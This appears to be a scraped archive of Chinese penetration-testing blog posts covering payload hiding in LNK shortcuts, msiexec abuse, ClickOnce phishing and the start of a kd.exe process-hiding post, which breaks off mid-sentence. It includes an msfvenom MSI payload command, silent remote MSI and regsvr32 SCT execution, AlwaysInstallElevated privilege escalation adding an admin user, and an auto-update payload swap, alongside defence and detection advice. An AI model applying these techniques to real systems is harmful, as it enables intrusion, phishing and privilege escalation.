存在相对路径4位 存在工作路径5位 存在命令行参数6位 存在自定义图标 如图 偏移14h，取4字节为000000f5,二进制表示为11110101 0、2、4、5、6位为1，对应包含如下属性： 有shell item id list 存在描述字符串 存在工作路径 存在命令行参数 存在自定义图标 4. 偏移 长度 说明 18h 4字节 目标文件属性 1ch 8字节 文件创建时间 24h 8字节 文件修改时间 2ch 8字节 文件最后一次访问时间 34h 4字节 目标文件长度 38h 4字节 自定义图标个数 3ch 4字节 窗口执行方式：1.正常2.最小化3.最大化 40h 4字节 热键 3、shell item id list由14h位置得出test.lnk存在shell item id list，所以从4ch开始的第一个段为shell item id list 偏移 长度 说明 4ch 2字节 shell item id list总长度 如图 shell item id list总长度为0129 下一段（描述字符串）的起始地址为004e+0129=0177h 4、描述字符串 偏移 长度 说明 004e+0129=0177h 2字节 长度（Unicode），实际长度要乘以2 如图 描述字符串长度为000c（Unicode） 下一段（工作路径）的起始地址为0177+2+000c×2=0191h 5、工作路径 偏移 长度 说明 0177+2+000c×2=0191h 2字节 长度（Unicode），实际长度要乘以2 如图 工作路径长度为0012（Unicode） 下一段（命令行参数）的起始地址为0191+2+0012×2=01b7h 6、命令行参数 偏移 长度 说明 0191+2+0012×2=01b7h 2字节 长度（Unicode），实际长度要乘以2 如图 命令行参数长度为039f（Unicode） 下一段（自定义图标）的起始地址为01b7+2+039f×2=08f7h 7、自定义图标 偏移 长度 说明 01b7+2+039f×2=08f7h 2字节 长度（Unicode），实际长度要乘以2 如图 自定义图标长度为000bf（Unicode） 下一段（自定义图标）的起始地址为08f7+2+000b×2=090fh 0x04 实现原理 结合Delphi的POC代码和Lnk文件格式，对比正常lnk文件和poc文件差异，发现只有命令行参数长度不同 故推断出原理： 只要命令行参数长度超过260即可！ 测试powershell代码: $file = Get-Content &quot;c:\test\test.txt&quot; $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;c:\test\test.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.Arguments = &#39; &#39;+ $file $Shortcut.Save() test.txt中写入如下内容： /c start calc.exe 执行命令后生成的test.lnk文件格式如图，260个空格字符后面接着为payload代码 查看文件参数，显示如图，均被空格字符填充，payload成功隐藏 运行test.lnk，弹出计算器，payload成功执行 完整过程如下图 gif在线地址： https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/5-1.gif 0x05 利用思路 可将payload放置在260个空字符之后 这样无法在文件属性查看payload，只能通过文件格式去分析 payload加密后分析难度也会变大 0x06 防御 注意lnk文件大小 必要情况下，直接分析16进制lnk文件格式 0x07 小结 对于lnk文件，虽然通过查看文件属性无法看到lnk文件的命令行参数，但不代表其不存在，在此提醒用户注意 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试中的msiexec]]></title>
    <url>%2Fposts%2F6dd48902.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇研究了ClickOnce的渗透技巧，接触到了安装包的概念。关于安装包还有一个常见的是msi文件，可在命令行下通过msiexec安装，所以这次就研究一下msiexec在渗透测试中的利用技巧 0x01 简介 msiexec: 系统进程，是Windows Installer的一部分 用于安装Windows Installer安装包（MSI） 一般在运行Microsoft Update安装更新或安装部分软件的时候出现，占用内存比较大 系统自带，在命令行下使用，参数说明如下： msiexec /Option &lt;Required Parameter&gt; [Optional Parameter] Install Options &lt;/package | /i&gt; &lt;Product.msi&gt; Installs or configures a product /a &lt;Product.msi&gt; Administrative install - Installs a product on the network /j&lt;u|m&gt; &lt;Product.msi&gt; [/t &lt;Transform List&gt;] [/g &lt;Language ID&gt;] Advertises a product - m to all users, u to current user &lt;/uninstall | /x&gt; &lt;Product.msi | ProductCode&gt; Uninstalls the product Display Options /quiet Quiet mode, no user interaction /passive Unattended mode - progress bar only /q[n|b|r|f] Sets user interface level n - No UI b - Basic UI r - Reduced UI f - Full UI (default) /help Help information Restart Options /norestart Do not restart after the installation is complete /promptrestart Prompts the user for restart if necessary /forcerestart Always restart the computer after installation Logging Options /l[i|w|e|a|r|u|c|m|o|p|v|x|+|!|*] &lt;LogFile&gt; i - Status messages w - Nonfatal warnings e - All error messages a - Start up of actions r - Action-specific records u - User requests c - Initial UI parameters m - Out-of-memory or fatal exit information o - Out-of-disk-space messages p - Terminal properties v - Verbose output x - Extra debugging information + - Append to existing log file ! - Flush each line to the log * - Log all information, except for v and x options /log &lt;LogFile&gt; Equivalent of /l* &lt;LogFile&gt; Update Options /update &lt;Update1.msp&gt;[;Update2.msp] Applies update(s) /uninstall &lt;PatchCodeGuid&gt;[;Update2.msp] /package &lt;Product.msi | ProductCode&gt; Remove update(s) for a product Repair Options /f[p|e|c|m|s|o|d|a|u|v] &lt;Product.msi | ProductCode&gt; Repairs a product p - only if file is missing o - if file is missing or an older version is installed (default) e - if file is missing or an equal or older version is installed d - if file is missing or a different version is installed c - if file is missing or checksum does not match the calculated value a - forces all files to be reinstalled u - all required user-specific registry entries (default) m - all required computer-specific registry entries (default) s - all existing shortcuts (default) v - runs from source and recaches local package Setting Public Properties [PROPERTY=PropertyValue] 0x02 制作.msi文件 1、使用metasploitmsf命令如下： msfvenom -f msi -p windows/exec CMD=calc.exe&gt;test.msi 运行后生成test.msi 双击可以直接安装，如图，弹出计算器 等价于在命令行下执行如下命令： msiexec /i test.msi 如下图，同时会弹出安装的对话框，可以使用/q参数来隐藏安装界面 命令行参数如下： msiexec /q /i test.msi 如图 执行后会在%TEMP%下生成MSI的log文件，如图 MSF为了能够让payload可扩展，生成msi文件的方式如下： 创建一个msi文件模板 在文件的固定位置保留一段地址用来存储payload 在运行过程中读取这个地址的内容并执行 细节可参考如下链接： http://rewtdance.blogspot.co.uk/2013/03/metasploit-msi-payload-generation.html 关于msi文件格式可参考： http://www.forensicswiki.org/w/images/5/5b/Compdocfileformat.pdf 2、使用Advanced InstallerAdvanced Installer是一款功能强大、可生成符合MS Windows认证的Windows Installer的MSI 安装包制作工具，具有友好的图形用户界面，直观而且非常简单的界面，是一款很好的 Windows Installer 编写工具 界面如下图，配置界面友好 在自定义行为中选择自定义操作，添加 LaunchFile 设置启动文件等参数，如图 导出msi文件，操作如图 生成文件如图 命令行参数如下： msiexec /q /i test2.msi 成功弹出cmd.exe,如图 值得注意的是弹出cmd的路径为c:\windows\installer\MSI3646.tmp 查看路径c:\windows\installer\，如图 其中6260236.msi和test2.msi的大小一样(其实就是test2.msi文件) 现在关闭弹出的cmd，再次查看路径c:\windows\installer\，如图 安装结束后，安装文件被删除，只留下.tmp文件，记录安装操作，内容如图 当然，在%TEMP%下也会生成MSI的log文件 0x03 远程下载执行msi文件 之前在文章《Use SCT to Bypass Application Whitelisting Protection》研究过regsvr32的应用技巧，可以在命令行下远程执行服务器上的sct文件命令行示例：regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll msiexec也同样支持这个功能 注： 如下链接介绍了远程执行同快捷方式结合，通过ole对象插入到excel文档进行钓鱼攻击的方法: https://labs.nettitude.com/blog/fun-with-windows-binaries-application-whitelist-bypass-using-msiexec/ 将msi文件上传到服务器，通过如下命令远程执行：msiexec /q /i https://raw.githubusercontent.com/3gstudent/test/master/testmsi.png 注： 由于是msf生成的msi文件，所以默认会被杀毒软件拦截，但操作只是一个弹出计算器 将自己开发的msi文件上传到服务器，通过如下命令远程执行：msiexec /q /i https://raw.githubusercontent.com/3gstudent/test/master/test3.msi成功执行msi文件，弹出cmd.exe 如图 0x04 权限提升 利用组策略可以实现权限提升 开启AlwaysInstallElevated特权安装功能： 打开组策略编辑器 用户配置-管理模板-Windows 组件-Windows Installer-永远以高特权进行安装：选择启用 计算机配置-管理模板-Windows 组件-Windows Installer-永远以高特权进行安装：选择启用 如图 此时会在注册表如下位置自动创建键值： [HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001 [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001 接下来，使用powerup完成提权添加用户的操作 powerup地址： https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 检查是否开启AlwaysInstallElevated： Get-RegistryAlwaysInstallElevated 返回true代表系统开启AlwaysInstallElevated 利用AlwaysInstallElevated添加用户： Write-UserAddMSI 运行后生成文件UserAdd.msi 这时以普通用户权限运行这个UserAdd.msi，成功添加账户 完整测试如图 成功在普通权限的cmd下添加一个管理员账户 注： 如果获得了对注册表的访问权限，可以通过更改注册表来开启AlwaysInstallElevated（必须同时修改两处注册表键值），进而提升权限，甚至当成提权后门 检测是否开启AlwaysInstallElevated： 查看注册表即可，cmd命令如下： reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 值全为1代表开启AlwaysInstallElevated，否则未开启 0x05 小结 通过msiexec，不仅能够在命令行实现远程下载执行代码，还能应用于权限提升，更多的利用方法值得研究。 当然，对照利用方法进行防御，只要关闭AlwaysInstallElevated，即可阻止通过msi文件的提权利用。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试中的ClickOnce]]></title>
    <url>%2Fposts%2F4d65236e.html</url>
    <content type="text"><![CDATA[0x00 前言 最近Casey Smith@subTee在《Mimikatz Delivery via ClickOnce with URL Parameters》中介绍了如何在ClickOnce程序中传入URL参数，实现执行mimikatz的技巧，并分享了一个POC 我对此很感兴趣，于是做了进一步的学习和研究 本文将会记录学习心得，介绍ClickOnce的使用方法，总结基于ClickOnce的攻击技巧和防御措施 博客地址： http://subt0x10.blogspot.com/2016/12/mimikatz-delivery-via-clickonce-with.html POC地址： https://gist.github.com/subTee/bd446efeacf656c67f5c17ca0787f15b 0x01 简介 ClickOnce： ClickOnce 是一种部署技术，使用该技术可创建自行更新的基于Windows的应用程序，这些应用程序可以通过最低程度的用户交互来安装和运行 使用用ClickOnce主要解决了程序部署中的几个问题： 更新应用程序的困难使用 Microsoft Windows Installer 部署，每次应用程序更新时，用户都必须重新安装整个应用程序；使用 ClickOnce 部署，则可以自动提供更新。只有更改过的应用程序部分才会被下载，然后会从新的并行文件夹重新安装完整的、更新后的应用程序。 对用户的计算机的影响使用 Windows Installer 部署时，应用程序通常依赖于共享组件，这便有可能发生版本冲突；而使用 ClickOnce 部署时，每个应用程序都是独立的，不会干扰其他应用程序。 安全权限Windows Installer 部署要求管理员权限并且只允许受限制的用户安装；而 ClickOnce 部署允许非管理用户安装应用程序并仅授予应用程序所需要的那些代码访问安全权限 简单理解，ClickOnce部署的优点： 简化安装和更新应用程序的过程 可以自动更新 支持从Web更新 更安全，仅授予应用程序所必需的权限，通常为Intranet区域 详细介绍可参考如下链接： https://msdn.microsoft.com/zh-cn/cn/library/142dbbz4(v=vs.90).aspx ClickOnce安装成功后，会在开始菜单下保存该安装程序 接下来介绍如何开发ClickOnce程序并在网站上发布 0x02 使用ClickOnce的常规方法 1、配置Web服务器测试系统：Windows Server 2008 R2 1.安装Web服务器（IIS） 在”服务器管理器”-“角色”-“添加角色”-选择”Web服务器（IIS）”进行安装 在”开始”-“管理工具”-“Internet信息服务（IIS）管理器”打开IIS，点击”浏览网站”，看是否正常显示 用http访问Windows Server 2008 Web服务器的IP地址，看是否正常显示 若以上测试通过，则说明IIS已安装成功且能正常使用 2.添加虚拟目录 设置别名：publich 设置物理路径：c:\publish 如图 访问该虚拟目录: http://192.168.81.140/publish/ 报错： HTTP 错误 403.14 - Forbidden Web 服务器被配置为不列出此目录的内容。 如图 3.启用目录浏览 打开IIS管理器，切换到功能试图，找到目录浏览，如图 在目录浏览的操作界面下选择启用，如图 此时，文件能够正常访问，如图 2、开发ClickOnce程序1.新建标准c#工程 添加测试代码： System.Diagnostics.Process.Start(&quot;calc.exe&quot;); 2.找到项目-属性-发布 如下图，设置发布文件夹位置，选择立即发布 C:\1下生成三个文件，分别为： setup.exe ConsoleApplication3.application Application Files 如图 安装成功后，在开始菜单自动生成快捷方式，文件夹名称为ClickOnce程序中发布者的名称 安装文件保存在%USERPROFILE%\Local Settings\Apps\2.0下 程序安装列表中也会存在，可在此处卸载ClickOnce 3.在IIS服务器上发布 将步骤2新生成的三个文件复制到c:\pubish下 4.测试 在另一台测试主机访问该Web目录，点击提示安全警告，如图 选择运行，接着提示安全警告，如图 选择运行，执行setup.exe，弹出计算器，如图 注： 在发布项下有多个选择可供选择，用来指定安装模式、应用程序文件、系统必备组件、更新选项等 0x03 基于ClickOnce的攻击技巧 基于ClickOnce的特性，最常见的利用方式为钓鱼攻击，所以接下来整理一下在钓鱼攻击中ClickOnce都有哪些利用方法 1、增加权限在用户看来，更新程序的过程常常需要管理员的权限，所以在运行更新程序的过程中，如果程序弹框提示需要管理员权限，用户往往会选择同意，触发的payload随即获得了管理员权限 2、利用自动更新功能替换payloadClickOnce支持自动更新功能，在运行时可检查新版本并自动更新 注: ClickOnce安装成功后，会在开始菜单下保存该安装程序 如图 开启自动更新的步骤：1.指定更新网址 设置”安装文件夹URL”，填入IIS服务器的下载地址就好，如图 注： IIS服务器上不需要安装Visual Studio 2.设定自动更新 选择更新选项，启用”应用程序应该检查更新”，如图 3.指定版本号 如下图，选定”随每次发布自动递增修订号” 4.测试 在IIS发布初始版本 测试主机下载安装 启用”应用程序应该检查更新”后，安装后的ClickOnce在每次运行时会访问服务器检查是否有更新，如果服务器有更新，会弹出更新对话框 如图 点击确定后，安装程序更新为新版本，成功实现替换payload 3、将url参数作为payload执行测试之前，Visual Studio需要作如下设置： 1.需要支持ClickOnce 安装Visual Studio的过程需要选择该项 如图 否则在”using System.Deployment.Application;”时会报错，提示如下： 命名空间“System.Deployment”中不存在类型或命名空间名“Application”(是否缺少程序集引用?) 2.添加引用 在项目工程中添加引用”System.Deployment”，如图 在项目工程中添加引用”System.Web” 否则报错，提示如下： 当前上下文中不存在名称“HttpUtility” 如图 3.设置”允许向应用程序传递URL参数” 如图 否则，无法向ClickOnce传入参数 测试代码如下： using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Deployment.Application; using System.Web; using System.Collections.Specialized; namespace ConsoleApplication3 { class Program { static void Main(string[] args) { try { NameValueCollection nvc = GetQueryStringParameters(); foreach (string key in nvc) { Console.WriteLine(nvc[key]); Console.ReadLine(); } } catch { Console.WriteLine(&quot;No Params&quot;); Console.ReadLine(); } } public static NameValueCollection GetQueryStringParameters() { NameValueCollection col = new NameValueCollection(); if (ApplicationDeployment.IsNetworkDeployed) { string queryString = ApplicationDeployment.CurrentDeployment.ActivationUri.Query; col = HttpUtility.ParseQueryString(queryString); } return col; } } } 注： 测试代码选自https://gist.github.com/subTee/bd446efeacf656c67f5c17ca0787f15b 将新的ClickOnce程序发布 注： 只需要将.application和Application Files上传至网站就好，不需要提供setup.exe 测试主机在IE浏览器访问如下URL： http://192.168.81.140/publish/ConsoleApplication3.application?N=TEST 程序自动识别参数并解析输出，如图 4、结合网站的重定向功能，触发不同的payload网站的重定向可导致URL的参数不同，这样就可以实现触发不同的payload 细节略 可参考https://blog.netspi.com/all-you-need-is-one-a-clickonce-love-story/ 0x04 钓鱼攻击的缺陷: 不同系统.net版本不同，所以钓鱼利用场景受限 系统在执行ClickOnce程序的过程会检查数字签名验证发布者，否则会提示安装包不可信 0x05 防御 1、对ClickOnce程序提高警惕，识别真伪运行特殊后缀名的程序(如.application)就会对ClickOnce程序进行安装，不需要setup.exe，用户需要对此提高警惕 2、禁用特殊后缀名,如.application不同.net版本生成的ClickOnce程序后缀名存在差异，如下链接有更详细的关于ClickOnce程序后缀名的介绍：https://robindotnet.wordpress.com/2010/06/12/mime-types-for-clickonce-deployment/ 0x06 检测 1、安装ClickOnce程序后，会在注册表留下痕迹注册表位置： HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 如图 2、安装ClickOnce程序后，会在如下目录保存文件：%USERPROFILE%\Local Settings\Apps\2.0 测试主机上的路径为： C:\Users\a\Local Settings\Apps\2.0 每个ClickOnce程序都有一个特殊名字的文件夹，如图 注： 删除文件夹将从系统中删除ClickOnce应用程序 3、安装程序列表也会存在ClickOnce程序名称0x07 小结 通过ClickOnce进行钓鱼，相比于常规的钓鱼方式，由于后缀名不常见，因此欺骗性更高，支持的扩展功能如解析URL参数、自动更新等功能，使得其利用方法更加灵活 但是，只要用户提高警惕，验证ClickOnce程序的数字证书，只运行受信任的程序，就可以防范此类钓鱼方式的攻击 未知攻焉知防，希望本文帮助大家更好的认识这个技术，保护自己的安全 参考学习资料： http://subt0x10.blogspot.com/2016/12/mimikatz-delivery-via-clickonce-with.html https://blog.netspi.com/all-you-need-is-one-a-clickonce-love-story/ http://www.sixdub.net/?p=555 https://msdn.microsoft.com/en-us/library/t71a733d.aspx https://www.rsa.com/content/dam/pdfs/a-decade-of-phishing-wp-11-2016.pdf LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Powershell tricks::Hide Process by kd.exe]]></title>
    <url>%2Fposts%2Faf05dd42.html</url>
    <content type="text"><![CDATA[0x00 前言 Pierre-Alexandre Braeken在SecTor2016上做了一个很棒的演讲——HACK MICROSOFT BY USING MICROSOFT SIGNED BINARIES 他对自己开源的工具PowerMemory做了介绍，将powershell同使用微软签名的程序相结合，可以绕过Device Guard和杀毒软件的拦截 演讲视频地址： https://sector.ca/sessions/hack-microsoft-by-using-microsoft-signed-binaries/ PowerMemory项目地址： https://github.com/giMini/PowerMemory/ 0x01 简介 PowerMemory内包含的脚本很多，其中一个比较有趣的脚本是Hide-Me.ps1，通过借助kb.exe来实现对进程的隐藏 本文将对该脚本进行测试，介绍进程隐藏的原理，修改原脚本，分析利用和防御方法。 0x02 相关概念 PCB(process control block)： 进程控制块，是系统为了管理进程专门设置的一个数据结构 PCB的组织方式： 线性表方式：不论进程的状态如何，将所有的PCB连续地存放在内存的系统区。这种方式适用于系统中进程数目不多的情况 索引表方式：该方式是线性表方式的改进，系统按照进程的状态分别建立就绪索引表、阻塞索引表等 链接表方式：系统按照进程的状态将进程的PCB组成队列，从而形成就绪队列、阻塞队列、运行队列等 不同操作系统的PCB结构不同 Windows下的PCB是EPROCESS结构 进程链表是一个双向环链表 EPROCESS结构： 每个进程都有一个EPROCESS结构，里面保存着进程的各种信息和相关结构的指针 注： Windows各版本的EPROCESS结构存在差异 EPROCESS结构位于系统地址空间，所以访问这个结构需要有ring0的权限 注： Windows开启Local kernel debugging模式后，可进入ring0，使用内核态调试器 基本的内核态调试器有以下两种： kd.exe（KD） 命令行模式 常用于调试内核态的应用程序和驱动程序，调试用户态的应用程序，或者监视操作系统自身的行为等 windbg.exe（WinDbg） 界面模式 可以为Windows内核、内核态驱动程序以及用户态应用程序提供完整的源代码级调试 通过kd.exe可以查看EPROCESS结构，命令行参数如下： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;dt nt!_eprocess&quot; 回显如下： lkd&gt; kd: Reading initial command &#39;dt nt!_eprocess;Q&#39; +0x000 Pcb : _KPROCESS +0x2d8 ProcessLock : _EX_PUSH_LOCK +0x2e0 RundownProtect : _EX_RUNDOWN_REF +0x2e8 UniqueProcessId : Ptr64 Void +0x2f0 ActiveProcessLinks : _LIST_ENTRY +0x300 Flags2 : Uint4B +0x300 JobNotReallyActive : Pos 0, 1 Bit +0x300 AccountingFolded : Pos 1, 1 Bit +0x300 NewProcessReported : Pos 2, 1 Bit +0x300 ExitProcessReported : Pos 3, 1 Bit +0x300 ReportCommitChanges : Pos 4, 1 Bit +0x300 LastReportMemory : Pos 5, 1 Bit +0x300 ForceWakeCharge : Pos 6, 1 Bit +0x300 CrossSessionCreate : Pos 7, 1 Bit +0x300 NeedsHandleRundown : Pos 8, 1 Bit +0x300 RefTraceEnabled : Pos 9, 1 Bit +0x300 DisableDynamicCode : Pos 10, 1 Bit +0x300 EmptyJobEvaluated : Pos 11, 1 Bit +0x300 DefaultPagePriority : Pos 12, 3 Bits +0x300 PrimaryTokenFrozen : Pos 15, 1 Bit +0x300 ProcessVerifierTarget : Pos 16, 1 Bit +0x300 StackRandomizationDisabled : Pos 17, 1 Bit +0x300 AffinityPermanent : Pos 18, 1 Bit +0x300 AffinityUpdateEnable : Pos 19, 1 Bit +0x300 PropagateNode : Pos 20, 1 Bit +0x300 ExplicitAffinity : Pos 21, 1 Bit +0x300 ProcessExecutionState : Pos 22, 2 Bits +0x300 DisallowStrippedImages : Pos 24, 1 Bit +0x300 HighEntropyASLREnabled : Pos 25, 1 Bit +0x300 ExtensionPointDisable : Pos 26, 1 Bit +0x300 ForceRelocateImages : Pos 27, 1 Bit +0x300 ProcessStateChangeRequest : Pos 28, 2 Bits +0x300 ProcessStateChangeInProgress : Pos 30, 1 Bit +0x300 DisallowWin32kSystemCalls : Pos 31, 1 Bit +0x304 Flags : Uint4B +0x304 CreateReported : Pos 0, 1 Bit +0x304 NoDebugInherit : Pos 1, 1 Bit +0x304 ProcessExiting : Pos 2, 1 Bit +0x304 ProcessDelete : Pos 3, 1 Bit +0x304 ControlFlowGuardEnabled : Pos 4, 1 Bit +0x304 VmDeleted : Pos 5, 1 Bit +0x304 OutswapEnabled : Pos 6, 1 Bit +0x304 Outswapped : Pos 7, 1 Bit +0x304 FailFastOnCommitFail : Pos 8, 1 Bit +0x304 Wow64VaSpace4Gb : Pos 9, 1 Bit +0x304 AddressSpaceInitialized : Pos 10, 2 Bits +0x304 SetTimerResolution : Pos 12, 1 Bit +0x304 BreakOnTermination : Pos 13, 1 Bit +0x304 DeprioritizeViews : Pos 14, 1 Bit +0x304 WriteWatch : Pos 15, 1 Bit +0x304 ProcessInSession : Pos 16, 1 Bit +0x304 OverrideAddressSpace : Pos 17, 1 Bit +0x304 HasAddressSpace : Pos 18, 1 Bit +0x304 LaunchPrefetched : Pos 19, 1 Bit +0x304 Background : Pos 20, 1 Bit +0x304 VmTopDown : Pos 21, 1 Bit +0x304 ImageNotifyDone : Pos 22, 1 Bit +0x304 PdeUpdateNeeded : Pos 23, 1 Bit +0x304 VdmAllowed : Pos 24, 1 Bit +0x304 ProcessRundown : Pos 25, 1 Bit +0x304 ProcessInserted : Pos 26, 1 Bit +0x304 DefaultIoPriority : Pos 27, 3 Bits +0x304 ProcessSelfDelete : Pos 30, 1 Bit +0x304 SetTimerResolutionLink : Pos 31, 1 Bit +0x308 CreateTime : _LARGE_INTEGER +0x310 ProcessQuotaUsage : [2] Uint8B +0x320 ProcessQuotaPeak : [2] Uint8B +0x330 PeakVirtualSize : Uint8B +0x338 VirtualSize : Uint8B +0x340 SessionProcessLinks : _LIST_ENTRY +0x350 ExceptionPortData : Ptr64 Void +0x350 ExceptionPortValue : Uint8B +0x350 ExceptionPortState : Pos 0, 3 Bits +0x358 Token : _EX_FAST_REF +0x360 WorkingSetPage : Uint8B +0x368 AddressCreationLock : _EX_PUSH_LOCK +0x370 PageTableCommitmentLock : _EX_PUSH_LOCK +0x378 RotateInProgress : Ptr64 _ETHREAD +0x380 ForkInProgress : Ptr64 _ETHREAD +0x388 CommitChargeJob : Ptr64 _EJOB +0x390 CloneRoot : _RTL_AVL_TREE +0x398 NumberOfPrivatePages : Uint8B +0x3a0 NumberOfLockedPages : Uint8B +0x3a8 Win32Process : Ptr64 Void +0x3b0 Job : Ptr64 _EJOB +0x3b8 SectionObject : Ptr64 Void +0x3c0 SectionBaseAddress : Ptr64 Void +0x3c8 Cookie : Uint4B +0x3d0 WorkingSetWatch : Ptr64 _PAGEFAULT_HISTORY +0x3d8 Win32WindowStation : Ptr64 Void +0x3e0 InheritedFromUniqueProcessId : Ptr64 Void +0x3e8 LdtInformation : Ptr64 Void +0x3f0 OwnerProcessId : Uint8B +0x3f8 Peb : Ptr64 _PEB +0x400 Session : Ptr64 Void +0x408 AweInfo : Ptr64 Void +0x410 QuotaBlock : Ptr64 _EPROCESS_QUOTA_BLOCK +0x418 ObjectTable : Ptr64 _HANDLE_TABLE +0x420 DebugPort : Ptr64 Void +0x428 WoW64Process : Ptr64 _EWOW64PROCESS +0x430 DeviceMap : Ptr64 Void +0x438 EtwDataSource : Ptr64 Void +0x440 PageDirectoryPte : Uint8B +0x448 ImageFilePointer : Ptr64 _FILE_OBJECT +0x450 ImageFileName : [15] UChar +0x45f PriorityClass : UChar +0x460 SecurityPort : Ptr64 Void +0x468 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x470 JobLinks : _LIST_ENTRY +0x480 HighestUserAddress : Ptr64 Void +0x488 ThreadListHead : _LIST_ENTRY +0x498 ActiveThreads : Uint4B +0x49c ImagePathHash : Uint4B +0x4a0 DefaultHardErrorProcessing : Uint4B +0x4a4 LastThreadExitStatus : Int4B +0x4a8 PrefetchTrace : _EX_FAST_REF +0x4b0 LockedPagesList : Ptr64 Void +0x4b8 ReadOperationCount : _LARGE_INTEGER +0x4c0 WriteOperationCount : _LARGE_INTEGER +0x4c8 OtherOperationCount : _LARGE_INTEGER +0x4d0 ReadTransferCount : _LARGE_INTEGER +0x4d8 WriteTransferCount : _LARGE_INTEGER +0x4e0 OtherTransferCount : _LARGE_INTEGER +0x4e8 CommitChargeLimit : Uint8B +0x4f0 CommitCharge : Uint8B +0x4f8 CommitChargePeak : Uint8B +0x500 Vm : _MMSUPPORT +0x5f8 MmProcessLinks : _LIST_ENTRY +0x608 ModifiedPageCount : Uint4B +0x60c ExitStatus : Int4B +0x610 VadRoot : _RTL_AVL_TREE +0x618 VadHint : Ptr64 Void +0x620 VadCount : Uint8B +0x628 VadPhysicalPages : Uint8B +0x630 VadPhysicalPagesLimit : Uint8B +0x638 AlpcContext : _ALPC_PROCESS_CONTEXT +0x658 TimerResolutionLink : _LIST_ENTRY +0x668 TimerResolutionStackRecord : Ptr64 _PO_DIAG_STACK_RECORD +0x670 RequestedTimerResolution : Uint4B +0x674 SmallestTimerResolution : Uint4B +0x678 ExitTime : _LARGE_INTEGER +0x680 InvertedFunctionTable : Ptr64 _INVERTED_FUNCTION_TABLE +0x688 InvertedFunctionTableLock : _EX_PUSH_LOCK +0x690 ActiveThreadsHighWatermark : Uint4B +0x694 LargePrivateVadCount : Uint4B +0x698 ThreadListLock : _EX_PUSH_LOCK +0x6a0 WnfContext : Ptr64 Void +0x6a8 Spare0 : Uint8B +0x6b0 SignatureLevel : UChar +0x6b1 SectionSignatureLevel : UChar +0x6b2 Protection : _PS_PROTECTION +0x6b3 HangCount : UChar +0x6b4 Flags3 : Uint4B +0x6b4 Minimal : Pos 0, 1 Bit +0x6b4 ReplacingPageRoot : Pos 1, 1 Bit +0x6b4 DisableNonSystemFonts : Pos 2, 1 Bit +0x6b4 AuditNonSystemFontLoading : Pos 3, 1 Bit +0x6b4 Crashed : Pos 4, 1 Bit +0x6b4 JobVadsAreTracked : Pos 5, 1 Bit +0x6b4 VadTrackingDisabled : Pos 6, 1 Bit +0x6b4 AuxiliaryProcess : Pos 7, 1 Bit +0x6b4 SubsystemProcess : Pos 8, 1 Bit +0x6b4 IndirectCpuSets : Pos 9, 1 Bit +0x6b4 InPrivate : Pos 10, 1 Bit +0x6b4 ProhibitRemoteImageMap : Pos 11, 1 Bit +0x6b4 ProhibitLowILImageMap : Pos 12, 1 Bit +0x6b4 SignatureMitigationOptIn : Pos 13, 1 Bit +0x6b8 DeviceAsid : Int4B +0x6c0 SvmData : Ptr64 Void +0x6c8 SvmProcessLock : _EX_PUSH_LOCK +0x6d0 SvmLock : Uint8B +0x6d8 SvmProcessDeviceListHead : _LIST_ENTRY +0x6e8 LastFreezeInterruptTime : Uint8B +0x6f0 DiskCounters : Ptr64 _PROCESS_DISK_COUNTERS +0x6f8 PicoContext : Ptr64 Void +0x700 TrustletIdentity : Uint8B +0x708 KeepAliveCounter : Uint4B +0x70c NoWakeKeepAliveCounter : Uint4B +0x710 HighPriorityFaultsAllowed : Uint4B +0x718 EnergyValues : Ptr64 _PROCESS_ENERGY_VALUES +0x720 VmContext : Ptr64 Void +0x728 SequenceNumber : Uint8B +0x730 CreateInterruptTime : Uint8B +0x738 CreateUnbiasedInterruptTime : Uint8B +0x740 TotalUnbiasedFrozenTime : Uint8B +0x748 LastAppStateUpdateTime : Uint8B +0x750 LastAppStateUptime : Pos 0, 61 Bits +0x750 LastAppState : Pos 61, 3 Bits +0x758 SharedCommitCharge : Uint8B +0x760 SharedCommitLock : _EX_PUSH_LOCK +0x768 SharedCommitLinks : _LIST_ENTRY +0x778 AllowedCpuSets : Uint8B +0x780 DefaultCpuSets : Uint8B +0x778 AllowedCpuSetsIndirect : Ptr64 Uint8B +0x780 DefaultCpuSetsIndirect : Ptr64 Uint8B 其中,+0x2f0 ActiveProcessLinks : _LIST_ENTRY表示进程活动链表 进程活动链表： 是一个PLIST_ENTRY结构的双向链表，把每个EPROCESS链接起来 当一个新进程建立的时候，父进程负责完成EPROCESS块，然后把ActiveProcessLinks链接到一个全局内核变量PsActiveProcessHead链表中 当进程结束的时候，该进程的EPROCESS结构从活动进程链上摘除 遍历整个链表，就能实现对进程的枚举 双链表的删除操作： 如图 void DDeleteNode(DListNode p) {//在带头结点的双链表中，删除结点p，设*p为非终端结点 p-&gt;prior-&gt;next=p-&gt;next;//① （使p的前一个结点的后驱直接指向 原来的p的后驱） p-&gt;next-&gt;prior=p-&gt;prior;//② （使p的后一个结点的前驱 直接为原来p的前一个结点） free(p);//③ （释放p的内存） } 图和说明引用自http://blog.163.com/haibianfeng_yr/blog/static/34572620201453061036702/ 隐藏进程： 